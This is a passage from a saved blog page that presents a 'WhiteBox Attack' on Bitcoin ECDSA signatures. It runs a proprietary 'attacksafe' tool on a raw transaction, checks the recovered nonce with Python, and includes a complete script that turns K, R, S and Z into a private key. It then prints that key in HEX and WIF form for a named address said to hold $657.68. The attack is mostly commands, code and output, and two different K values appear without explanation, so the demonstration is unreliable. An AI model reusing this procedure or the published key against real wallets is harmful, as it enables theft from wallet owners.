

<pre class="wp-block-code"><code>./attacksafe -tool whitebox_attack -open RawTX.txt -save SecretKey.txt</code></pre>



<figure class="wp-block-image"><img decoding="async" src="./We implement WhiteBox Attack on Bitcoin with differential errors according to the research scheme of Eli Biham and Adi Shamir to extract the secret key - CRYPTO DEEP TECH_files/image-60-1024x258.png" alt="We implement WhiteBox Attack on Bitcoin with differential errors according to the research scheme of Eli Biham and Adi Shamir to extract the secret key" class="wp-image-1673"></figure>



<p>We launched this attack from&nbsp;<code>-tool whitebox_attack</code>and the result was saved to a file<code>SecretKey.txt</code></p>



<p>Now to see the successful result, open the file<code>SecretKey.txt</code></p>



<pre class="wp-block-code"><code>cat SecretKey.txt</code></pre>



<figure class="wp-block-image"><img decoding="async" src="./We implement WhiteBox Attack on Bitcoin with differential errors according to the research scheme of Eli Biham and Adi Shamir to extract the secret key - CRYPTO DEEP TECH_files/image-61-1024x376.png" alt="We implement WhiteBox Attack on Bitcoin with differential errors according to the research scheme of Eli Biham and Adi Shamir to extract the secret key" class="wp-image-1674"></figure>



<pre class="wp-block-code"><code>Deployments ECDSA:

SecretKey = 0xe7d9497ff0bab6f5dbbed781bc75be51ad98bbd70304e4def52c64e90b9822c2

RawTX = 0100000001090090e02de381ea337027a92b40cf9ea64c49f3ff4a5dc6e86514cbb3e6fbba210000006b483045022100abfd0edfab28bfdaffd134487cbba8baba8796ae5da45cf5bdd8b73f221edfc902201b52781a8e038c877146d0671638be48da3a0e946589ebdc3bb876d351292ddc012102506c7593c4e301c2729dbfc46b2959c7a92f6f20c672b6d0feff9c5b6a567cf9ffffffff0180020000000000001976a914e94a23147d57674a7b817197be14877853590e6e88ac00000000</code></pre>



<p>We see an inscription&nbsp;<code>"Deployments ECDSA"</code>that means a critical vulnerability in the Bitcoin blockchain transaction.</p>



<p><code>SecretKey value in HEX format, this is our secret key "K" (NONCE):</code></p>



<p><code>K = 0xdd3fee317f873f30a38a54c2566a07cb7682612e3564996017b993b5416fcddc</code></p>



<hr class="wp-block-separator has-alpha-channel-opacity">



<h2>Let’s check with a&nbsp;<em>Python</em>&nbsp;script<code>point2gen.py</code></h2>



<hr class="wp-block-separator has-alpha-channel-opacity">



<p><a href="https://pypi.org/project/ECPy/" target="_blank" rel="noreferrer noopener"><strong>Let’s use the ECPy</strong></a>&nbsp;elliptic curve library&nbsp;:</p>



<p>Now let’s run the script by specifying&nbsp;<code>Secret Key "K" (NONCE)</code>:</p>



<pre class="wp-block-code"><code>python3 point2gen.py 0xe7d9497ff0bab6f5dbbed781bc75be51ad98bbd70304e4def52c64e90b9822c2</code></pre>



<figure class="wp-block-image"><img decoding="async" src="./We implement WhiteBox Attack on Bitcoin with differential errors according to the research scheme of Eli Biham and Adi Shamir to extract the secret key - CRYPTO DEEP TECH_files/image-62-1024x85.png" alt="We implement WhiteBox Attack on Bitcoin with differential errors according to the research scheme of Eli Biham and Adi Shamir to extract the secret key" class="wp-image-1675"></figure>



<p><code>(0xabfd0edfab28bfdaffd134487cbba8baba8796ae5da45cf5bdd8b73f221edfc9 , 0x9d29d467ba4eaea83ab268250f3101b200f66cebbbd0871c2a4c8af9d8730962)</code></p>



<p>Checking the coordinates of a point&nbsp;<code>EC (secp256k1)&nbsp;</code>with a signature value<code>R</code></p>



<pre class="wp-block-code"><code>R = 0xabfd0edfab28bfdaffd134487cbba8baba8796ae5da45cf5bdd8b73f221edfc9
S = 0x1b52781a8e038c877146d0671638be48da3a0e946589ebdc3bb876d351292ddc
Z = 0x4ff2faf760c97ea590a3c7deec2698695e9559d629d1e73271623fd07cfbeffa</code></pre>



<hr class="wp-block-separator has-alpha-channel-opacity">



<pre class="wp-block-code"><code>R          =    0xabfd0edfab28bfdaffd134487cbba8baba8796ae5da45cf5bdd8b73f221edfc9
point2gen  =   (0xabfd0edfab28bfdaffd134487cbba8baba8796ae5da45cf5bdd8b73f221edfc9 , 0x9d29d467ba4eaea83ab268250f3101b200f66cebbbd0871c2a4c8af9d8730962)</code></pre>



<p><code>ALL CORRECT!</code></p>



<p><code>K = 0xe7d9497ff0bab6f5dbbed781bc75be51ad98bbd70304e4def52c64e90b9822c2</code></p>



<p>Now knowing the secret key, we can get the private key to the Bitcoin Wallet:<code>15wGrVZpLjfg47ZG43hHuJtrfdQyNFYGNz</code></p>



<hr class="wp-block-separator has-alpha-channel-opacity">



<h2>Let’s use&nbsp; the&nbsp;<em>Python</em>&nbsp;script:&nbsp;&nbsp;<code>calculate.py</code>&nbsp;&gt; &gt; &gt; Get the Private Key</h2>



<hr class="wp-block-separator has-alpha-channel-opacity">



<p>Let’s open the code and add all the value of the signatures<code><strong>K, R, S, Z</strong></code></p>



<pre class="wp-block-code"><code>def h(n):
    return hex(n).replace("0x","")

def extended_gcd(aa, bb):
    lastremainder, remainder = abs(aa), abs(bb)
    x, lastx, y, lasty = 0, 1, 1, 0
    while remainder:
        lastremainder, (quotient, remainder) = remainder, divmod(lastremainder, remainder)
        x, lastx = lastx - quotient*x, x
        y, lasty = lasty - quotient*y, y
    return lastremainder, lastx * (-1 if aa &lt; 0 else 1), lasty * (-1 if bb &lt; 0 else 1)

def modinv(a, m):
    g, x, y = extended_gcd(a, m)
    if g != 1:
        raise ValueError
    return x % m
    
N = 0xfffffffffffffffffffffffffffffffebaaedce6af48a03bbfd25e8cd0364141


K = 0xe7d9497ff0bab6f5dbbed781bc75be51ad98bbd70304e4def52c64e90b9822c2
R = 0xabfd0edfab28bfdaffd134487cbba8baba8796ae5da45cf5bdd8b73f221edfc9
S = 0x1b52781a8e038c877146d0671638be48da3a0e946589ebdc3bb876d351292ddc
Z = 0x4ff2faf760c97ea590a3c7deec2698695e9559d629d1e73271623fd07cfbeffa


print (h((((S * K) - Z) * modinv(R,N)) % N))</code></pre>



<h2>The script will calculate the private key using the formula:</h2>



<p><code>Privkey = ((((S * K) - Z) * modinv(R,N)) % N)</code></p>



<p>Let’s run the script:</p>



<pre class="wp-block-code"><code>python3 calculate.py</code></pre>



<figure class="wp-block-image"><img decoding="async" src="./We implement WhiteBox Attack on Bitcoin with differential errors according to the research scheme of Eli Biham and Adi Shamir to extract the secret key - CRYPTO DEEP TECH_files/image-63.png" alt="We implement WhiteBox Attack on Bitcoin with differential errors according to the research scheme of Eli Biham and Adi Shamir to extract the secret key" class="wp-image-1676"></figure>



<p><code>PrivKey = 16f2eaf0c267f036f926d0b1332c05f244427c65ce70a11b96842bf1a8221301</code></p>



<p><strong><a href="https://cryptodeep.ru/bitaddress.html" target="_blank" rel="noreferrer noopener">Let’s open bitaddress</a></strong>&nbsp;and&nbsp;check:</p>



<pre class="wp-block-code"><code>ADDR: 15wGrVZpLjfg47ZG43hHuJtrfdQyNFYGNz
WIF:  KwzKYYfPTrdAZA5m1kxs4WAjSWTuJRnD2ANKHGUugibgFBP4oDSG
HEX:  16f2eaf0c267f036f926d0b1332c05f244427c65ce70a11b96842bf1a8221301</code></pre>


<div class="wp-block-image">
<figure class="aligncenter"><img decoding="async" src="./We implement WhiteBox Attack on Bitcoin with differential errors according to the research scheme of Eli Biham and Adi Shamir to extract the secret key - CRYPTO DEEP TECH_files/003-2.png" alt="We implement WhiteBox Attack on Bitcoin with differential errors according to the research scheme of Eli Biham and Adi Shamir to extract the secret key" class="wp-image-1694"></figure></div>


<hr class="wp-block-separator has-alpha-channel-opacity">



<p><a href="https://www.blockchain.com/btc/address/15wGrVZpLjfg47ZG43hHuJtrfdQyNFYGNz">https://www.blockchain.com/btc/address/15wGrVZpLjfg47ZG43hHuJtrfdQyNFYGNz</a></p>



<hr class="wp-block-separator has-alpha-channel-opacity">



<p><code>Private Key Found!</code></p>


<div class="wp-block-image">
<figure class="aligncenter"><img decoding="async" src="./We implement WhiteBox Attack on Bitcoin with differential errors according to the research scheme of Eli Biham and Adi Shamir to extract the secret key - CRYPTO DEEP TECH_files/003-addr.png" alt="We implement WhiteBox Attack on Bitcoin with differential errors according to the research scheme of Eli Biham and Adi Shamir to extract the secret key" class="wp-image-1679"><figcaption class="wp-element-caption"><strong><a href="https://www.blockchain.com/btc/address/15wGrVZpLjfg47ZG43hHuJtrfdQyNFYGNz" target="_blank" rel="noreferrer noopener"><code>www.blockchain.com/btc/address/15wGrVZpLjfg47ZG43hHuJtrfdQyNFYGNz</code></a></strong></figcaption></figure></div>


<p><code>BALANCE: $ 657.68</code></p>



<hr class="wp-block-separator has-alpha-channel-opacity">



<hr class="wp-block-separator has-alpha-channel-opacity">



<p><strong><a href="https://github.com/demining/CryptoDeepTools/tree/main/16WhiteBoxAttack" target="_blank" rel="noreferrer noopener">Source</a></strong></p>



<p><strong><a href="https://attacksafe.ru/software" target="_blank" rel="noreferrer noopener">ATTACKSAFE SOFTWARE</a></strong></p>



<p><strong><a href="https://t.me/cryptodeeptech" target="_blank" rel="noreferrer noopener">Telegram: https://t.me/cryptodeeptech</a></strong></p>



<p><strong><a href="https://youtu.be/dLy74McEFTg" target="_blank" rel="noreferrer noopener">Video: https://youtu.be/dLy74McEFTg</a></strong></p>



<p><a href="https://cryptodeeptech.ru/whitebox-attack" target="_blank" rel="noreferrer noopener"><strong>Source: https://cryptodeeptech.ru/whitebox-attack</strong></a></p>



<hr class="wp-block-separator has-alpha-channel-opacity">


<div class="wp-block-image">
<figure class="aligncenter"><img decoding="async" src="./We implement WhiteBox Attack on Bitcoin with differential errors according to the research scheme of Eli Biham and Adi Shamir to extract the secret key - CRYPTO DEEP TECH_files/023-1-1024x576.png" alt="We implement WhiteBox Attack on Bitcoin with differential errors according to the research scheme of Eli Biham and Adi Shamir to extract the secret key" class="wp-image-1685"></figure></div>


<p></p>
	</div><!-- .entry-content -->

	<footer class="entry-footer">
		<div class="cat-links"><i class="fa fa-folder-open" aria-hidden="true"></i> <a href="https://cryptodeeptech.ru/category/cryptanalysis/" rel="category tag">Cryptanalysis</a></div>	</footer><!-- .entry-footer -->
</article><!-- #post-1175 -->

	<nav class="navigation post-navigation" aria-label="Записи">
		<h2 class="screen-reader-text">Навигация по записям</h2>
		<div class="nav-links"><div class="nav-previous"><a href="https://cryptodeeptech.ru/exchange-hacks/" rel="prev">Full list of cryptocurrency exchange hacks [ 2011 – 2022 ]</a></div></div>
	</nav>		<div id="itng_related_posts_wrapper">
			<h3 id="itng_related_posts_title">Related Posts</h3>
			<div class="itng-related-posts row">
				<article id="post-71" class="itng-blog col-md-6 col-lg-4 post-71 post type-post status-publish format-standard hentry category-cryptanalysis">
		<div class="itng-card-wrapper">
			<div class="itng-thumb">
							</div>
			
			<div class="itng-card-content">
				<div class="entry-meta">
					<a href="https://cryptodeeptech.ru/lattice-attack/"></a>
					<span class="byline"> <span class="author vcard"><a class="url fn n" href="https://cryptodeeptech.ru/author/cryptodeeptech/">Crypto Deep Tech</a></span></span>				</div><!-- .entry-meta -->
				
				<header class="entry-header">
					<h2 class="entry-title"><a href="https://cryptodeeptech.ru/lattice-attack/">With the help of Lattice Attack, we received a Private Key to BITCOIN</a></h2>				</header><!-- .entry-header -->
				
				<div class="itng_excerpt">
					What do we know about the lattice attack? To begin with, the&nbsp;&nbsp;elliptic curve digital signature algorithm&nbsp;(ECDSA)&nbsp;&nbsp;is a common digital signature scheme that we see in many of our code reviews.&nbsp;It has some desirable properties, but can also be very fragile to recover the private key with a side-channel attack that reveals less than one bit of the…				</div>
				
				<div class="blog-footer">
					<div class="itng_cats">
						<a href="https://cryptodeeptech.ru/category/cryptanalysis/" rel="category tag">Cryptanalysis</a>					</div>
					<div class="blog-comments">
						0					</div>
				</div>
			</div>
		</div>
</article><!-- #post-71 --><article id="post-619" class="itng-blog col-md-6 col-lg-4 post-619 post type-post status-publish format-standard hentry category-cryptanalysis">
		<div class="itng-card-wrapper">
			<div class="itng-thumb">
							</div>
			
			<div class="itng-card-content">
				<div class="entry-meta">
					<a href="https://cryptodeeptech.ru/frey-ruck-attack/"></a>
					<span class="byline"> <span class="author vcard"><a class="url fn n" href="https://cryptodeeptech.ru/author/cryptodeeptech/">Crypto Deep Tech</a></span></span>				</div><!-- .entry-meta -->
				
				<header class="entry-header">
					<h2 class="entry-title"><a href="https://cryptodeeptech.ru/frey-ruck-attack/">Implement Frey-Rück Attack to get the secret key “K” (NONCE)</a></h2>				</header><!-- .entry-header -->
				
				<div class="itng_excerpt">
					In this article, we implement an efficient&nbsp;Frey-Rück Attack&nbsp;algorithm for signing&nbsp;ECDSAa transaction on the Bitcoin blockchain.&nbsp;In our earlier posts, we touched on the topic of signature vulnerability several times&nbsp;ECDSA.&nbsp;With a critical vulnerability in the Bitcoin blockchain transaction, we can solve the rather difficult discrete logarithm problem to extract the&nbsp;ECDSA&nbsp;secret key"K" (NONCE)&nbsp;from the vulnerable signature in order to ultimately…				</div>
				
				<div class="blog-footer">
					<div class="itng_cats">
						<a href="https://cryptodeeptech.ru/category/cryptanalysis/" rel="category tag">Cryptanalysis</a>					</div>
					<div class="blog-comments">
						0					</div>
				</div>
			</div>
		</div>
</article><!-- #post-619 --><article id="post-1" class="itng-blog col-md-6 col-lg-4 post-1 post type-post status-publish format-standard hentry category-cryptanalysis">
		<div class="itng-card-wrapper">
			<div class="itng-thumb">
							</div>
			
			<div class="itng-card-content">
				<div class="entry-meta">
					<a href="https://cryptodeeptech.ru/terminal-google-colab/"></a>
					<span class="byline"> <span class="author vcard"><a class="url fn n" href="https://cryptodeeptech.ru/author/cryptodeeptech/">Crypto Deep Tech</a></span></span>				</div><!-- .entry-meta -->
				
				<header class="entry-header">
					<h2 class="entry-title"><a href="https://cryptodeeptech.ru/terminal-google-colab/">We create our own terminal in Google Colab for work in GitHub, GDrive, NGrok, etc.</a></h2>				</header><!-- .entry-header -->
				
				<div class="itng_excerpt">
					Currently, machine learning and deep learning have become the hottest trend in the computer science industry.&nbsp;Many developers create amazing projects with Google Colab. What is Google Colab? Google Colab was developed by Google to provide free access to GPUs and TPUs.&nbsp;Google Colab can be defined as an improved version of Jupyter Notebook. Features of Google Colab Google…				</div>
				
				<div class="blog-footer">
					<div class="itng_cats">
						<a href="https://cryptodeeptech.ru/category/cryptanalysis/" rel="category tag">Cryptanalysis</a>					</div>
					<div class="blog-comments">
						0					</div>
				</div>
			</div>
		</div>
</article><!-- #post-1 -->			</div>
		</div>
			<div id="author_box" class="row no-gutters">
			<div class="author_avatar col-2">
							</div>
			<div class="author_info col-10">
				<h4 class="author_name title-font">
					Crypto Deep Tech				</h4>
				<div class="author_bio">
									</div>
			</div>
		</div>
	
	</main><!-- #main -->

<!--WCLEARFY_PAGE_TYPE_post--><!--WCLEARFY_FOOTER_START--></div><!-- #content-wrapper -->


 <div id="footer-sidebar" class="widget-area">
    <div class="container">
        <div class="row">
                    </div>
    </div>
</div>
	<footer id="colophon" class="site-footer">
		<div class="container">
			<div class="site-info">
				Donation Address: <a href="https://www.blockchain.com/btc/address/1Lw2kh9WzCActXSGHxyypGLkqQZfxDpw8v" target="_blank">♥  BTC: 1Lw2kh9WzCActXSGHxyypGLkqQZfxDpw8v</a>				<span class="sep"> | </span>
					Copyright © 2022 «CRYPTO DEEP TECH». 			</div><!-- .site-info -->
		</div>
	</footer><!-- #colophon -->
</div><!-- #page -->

<nav id="menu" class="panel" role="navigation" style="position: fixed; top: 0px; bottom: 0px; height: 100%; left: -15.625em; width: 15.625em;">
	<div class="menu-overlay"></div>
	<div id="panel-top-bar">
		<button class="go-to-bottom"></button>
		<button id="close-menu" class="menu-link"><i class="fa fa-chevron-left" aria-hidden="true"></i></button>
	</div>

	<ul id="menu-main" class="menu"><li id="menu-item-229" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-home"><a href="https://cryptodeeptech.ru/">HOME</a></li>
<li id="menu-item-225" class="menu-item menu-item-type-post_type menu-item-object-page"><a href="https://cryptodeeptech.ru/publication/">PUBLICATIONS</a></li>
<li id="menu-item-226" class="menu-item menu-item-type-post_type menu-item-object-page"><a href="https://cryptodeeptech.ru/study/">STUDY</a></li>
<li id="menu-item-227" class="menu-item menu-item-type-post_type menu-item-object-page"><a href="https://cryptodeeptech.ru/resources/">RESOURCES</a></li>
<li id="menu-item-228" class="menu-item menu-item-type-post_type menu-item-object-page"><a href="https://cryptodeeptech.ru/contacts/">CONTACTS</a></li>
<li id="menu-item-240" class="menu-item menu-item-type-post_type menu-item-object-post"><a href="https://cryptodeeptech.ru/lattice-attack/">BLOG</a></li>
<li id="menu-item-541" class="menu-item menu-item-type-post_type menu-item-object-page"><a href="https://cryptodeeptech.ru/eng/">ENG</a></li>
<li id="menu-item-542" class="menu-item menu-item-type-post_type menu-item-object-page"><a href="https://cryptodeeptech.ru/rus/">RUS</a></li>
</ul>
	<button class="go-to-top"></button>
</nav>

<div id="sticky-navigation">
	<div class="nav-wrapper">
		 <div class="container">

			 <div class="row justify-content-end align-items-center justify-content-between no-gutters">


				<div class="main-navigation col-lg-9" role="navigation">
					<ul id="menu-desktop" class="menu"><li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-home menu-item-229"><a href="https://cryptodeeptech.ru/">HOME</a></li>
<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-225"><a href="https://cryptodeeptech.ru/publication/">PUBLICATIONS</a></li>
<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-226"><a href="https://cryptodeeptech.ru/study/">STUDY</a></li>
<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-227"><a href="https://cryptodeeptech.ru/resources/">RESOURCES</a></li>
<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-228"><a href="https://cryptodeeptech.ru/contacts/">CONTACTS</a></li>
<li class="menu-item menu-item-type-post_type menu-item-object-post menu-item-240"><a href="https://cryptodeeptech.ru/lattice-attack/">BLOG</a></li>
<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-541"><a href="https://cryptodeeptech.ru/eng/">ENG</a></li>
<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-542"><a href="https://cryptodeeptech.ru/rus/">RUS</a></li>
</ul>				</div>

				<button href="#menu" class="menu-link mobile-nav-btn"><i class="fa fa-bars" aria-hidden="true"></i></button>

				<button type="button" id="go-to-field" tabindex="-1"></button>

				<button class="search-btn-sticky ml-auto col-auto"><i class="fa fa-search"></i></button>
				
<div class="itng-search-sticky">
	<form role="search" method="get" class="search-form" action="https://cryptodeeptech.ru/">
				<label>
					<span class="screen-reader-text">Найти:</span>
					<input type="search" class="search-field" placeholder="Поиск…" value="" name="s">
				</label>
				<input type="submit" class="search-submit" value="Поиск">
			</form>	<button type="button" id="go-to-btn" tabindex="-1"></button>
</div>

			</div>
		</div>
	</div>
</div>

<div id="itng-back-to-top" class="show"><i class="fa fa-chevron-up" aria-hidden="true"></i></div>

		<script type="text/javascript">
							jQuery("#post-1175 .entry-meta .date").css("display","none");
					jQuery("#post-1175 .entry-date").css("display","none");
					jQuery("#post-1175 .posted-on").css("display","none");
							jQuery("#post-71 .entry-meta .date").css("display","none");
					jQuery("#post-71 .entry-date").css("display","none");
					jQuery("#post-71 .posted-on").css("display","none");
							jQuery("#post-619 .entry-meta .date").css("display","none");
					jQuery("#post-619 .entry-date").css("display","none");
					jQuery("#post-619 .posted-on").css("display","none");
							jQuery("#post-1 .entry-meta .date").css("display","none");
					jQuery("#post-1 .entry-date").css("display","none");
					jQuery("#post-1 .posted-on").css("display","none");
				</script>
	<script src="./We implement WhiteBox Attack on Bitcoin with differential errors according to the research scheme of Eli Biham and Adi Shamir to extract the secret key - CRYPTO DEEP TECH_files/wmac_single_2b1ae4cca3cc8d12c39be427685.js" id="big-slide-js"></script>
<script src="./We implement WhiteBox Attack on Bitcoin with differential errors according to the research scheme of Eli Biham and Adi Shamir to extract the secret key - CRYPTO DEEP TECH_files/wmac_single_ccdf893e7d8b26933af0c336bcc.js" id="owl-js-js"></script>
<script src="./We implement WhiteBox Attack on Bitcoin with differential errors according to the research scheme of Eli Biham and Adi Shamir to extract the secret key - CRYPTO DEEP TECH_files/jquery.magnific-popup.min.js" id="mag-lightbox-js-js"></script>
<script id="itng-custom-js-js-extra">
var itng = {"toTopEnable":"1","stickyNav":""};
</script>
<script src="./We implement WhiteBox Attack on Bitcoin with differential errors according to the research scheme of Eli Biham and Adi Shamir to extract the secret key - CRYPTO DEEP TECH_files/wmac_single_ea8874ba65dbd53bf5c7fb5c619.js" id="itng-custom-js-js"></script>
<script src="./We implement WhiteBox Attack on Bitcoin with differential errors according to the research scheme of Eli Biham and Adi Shamir to extract the secret key - CRYPTO DEEP TECH_files/wmac_single_6ec0e9b3201c83a442e24aba829.js" id="itng-navigation-js"></script>
<!-- Yandex.Metrika counter --> <script type="text/javascript"> (function(m,e,t,r,i,k,a){m[i]=m[i]||function(){(m[i].a=m[i].a||[]).push(arguments)}; m[i].l=1*new Date();k=e.createElement(t),a=e.getElementsByTagName(t)[0],k.async=1,k.src=r,a.parentNode.insertBefore(k,a)}) (window, document, "script", "https://mc.yandex.ru/metrika/tag.js", "ym"); ym(89424273, "init", {  id:89424273, clickmap:true, trackLinks:true, webvisor:true, accurateTrackBounce:true }); </script> <noscript><div><img src="https://mc.yandex.ru/watch/89424273" style="position:absolute; left:-9999px;" alt="" /></div></noscript> <!-- /Yandex.Metrika counter -->
<!-- Yandex.Metrika counter -->
<script type="text/javascript">
   (function(m,e,t,r,i,k,a){m[i]=m[i]||function(){(m[i].a=m[i].a||[]).push(arguments)};
   var z = null;m[i].l=1*new Date();
   for (var j = 0; j < document.scripts.length; j++) {if (document.scripts[j].src === r) { return; }}
   k=e.createElement(t),a=e.getElementsByTagName(t)[0],k.async=1,k.src=r,a.parentNode.insertBefore(k,a)})
   (window, document, "script", "https://mc.yandex.ru/metrika/tag.js", "ym");

   ym(89995532, "init", {
        clickmap:true,
        trackLinks:true,
        accurateTrackBounce:true,
        webvisor:true
   });
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/89995532" style="position:absolute; left:-9999px;" alt="" /></div></noscript>
<!-- /Yandex.Metrika counter -->



<!--
Performance optimized by W3 Total Cache. Learn more: https://www.boldgrid.com/w3-total-cache/

Кэширование страницы с использованием disk: enhanced 

Served from: cryptodeeptech.ru @ 2022-11-13 04:09:54 by W3 Total Cache
--></body></html>